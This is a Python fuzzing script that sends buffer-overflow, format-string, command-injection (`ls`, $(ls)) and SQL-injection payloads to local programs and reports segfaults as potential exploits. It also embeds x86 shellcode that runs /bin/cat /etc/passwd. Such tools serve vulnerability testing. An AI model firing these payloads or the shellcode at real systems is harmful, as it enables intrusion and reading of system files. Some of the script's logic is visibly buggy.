#!/usr/bin/python3
from subprocess import Popen, PIPE, STDOUT,check_output
import time,string,re,base64,glob,argparse

import os,multiprocessing

shellcode = ('\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61' \
                '\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80')

organized_payloads = {}
organized_payloads['bof']=['a'*300,"\x8b\x87\x04\x08"*100]
organized_payloads['format']=['%x','%n '*10,'a'*16+' %x']
organized_payloads['rce']=['`ls`','$(ls)','#$(ls)']
organized_payloads['sql']=["'-- ",'"-- ',"' or 'adsa'='adsa"]
organized_payloads['logic']=['; return true','; return True','; return false','; return False']
organized_payloads['misc']=[i*10 for i in string.punctuation]
organized_payloads['whitespace']=[' '*66,'\n'*64,'\t'*32]
organized_payloads['stupid']=['-s','--shell','--exec ls','--exec']

pattern = r'(?i)segmentation|fault|stack smashing|shell|bash|execute|\[.*?\] (.*?)\[.*?\].*?segfault at \d+ ip (\d+)'
digit_search=r'(\d+)$'

def get_files(path,recurse):
    files = []
    for i in glob.glob(path,recursive=recurse):
        if os.path.isfile(i):
            files.append(i)
    return files

def b64(payload):
    return base64.b64encode(bytes(payload,'utf-8')).decode('utf-8')

def stdOutput(proc,stdout_data):
    while True:
        line = proc.stdout.readline().decode('utf-8')
        if line.strip(' ').strip('\n').strip('\t') != '':
            stdout_data.put(line)


def stdinInput(path,pay_type,payload):
    stdout_data = multiprocessing.Queue()
    output = ''
    try:
        p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE,shell=True)
        t = multiprocessing.Process(target=stdOutput,args=(p,stdout_data))
        t.start()
        time.sleep(1)
        p.communicate(bytes(payload+'\n','utf-8'),timeout=1)
        time.sleep(1)

        t.terminate()
        

        for i in range(stdout_data.qsize()):
            output += stdout_data.get()

        if p.poll() == 139: #Detected segfault
            dmesg = check_output("dmesg -e | tail -n 1",shell=True).decode('utf-8')
            match = re.search(pattern,dmesg)
            if match:
                print(f'Potential Exploit in {match.group(1)}: EIP = ',match.group(2))
        else:
            pass
        input("WAIT")
        return
    except Exception as e:
        print("Unable to communicate with the process")
        print(e)
    


def main(files):
    for i in files:
        for j in organized_payloads.keys():
            for k in organized_payloads[j]:
                print(f'Sending {j} to {i}')
                stdinInput(i,j,k)
                input('Waiting')

        
if __name__ == '__main__':
    a = argparse.ArgumentParser()
    a.add_argument('-p','--path',type=str,help='directory or file to fuzz',action='store',dest='path',required=True)
    a.add_argument('-e','--ext',type=str,help='file extension to use (.txt,.exe,.elf)',action='store',dest='ext')
    a.add_argument('-r','--recurse',help='include to recursively look through directory provided',action='store_true',dest='recurse')
    
    var = (vars(a.parse_args()))
    path = os.path.normpath(var['path'])
    
    recurse=(True if var['recurse'] else False)
    ext=('**' if recurse else '*')
    
    try:
        ext+=var['ext']
    except:
        pass     
    
    if not os.path.exists(path):
        print("The path provided does not exist")
        raise IsADirectoryError    
    if os.path.isfile(path):
        files = path
    else:
        files = get_files(path+('\\' if os.name=='nt' else '/')+ext,recurse)
        

    try:
        main(files)
    except KeyboardInterrupt:
        print("Goodbye")
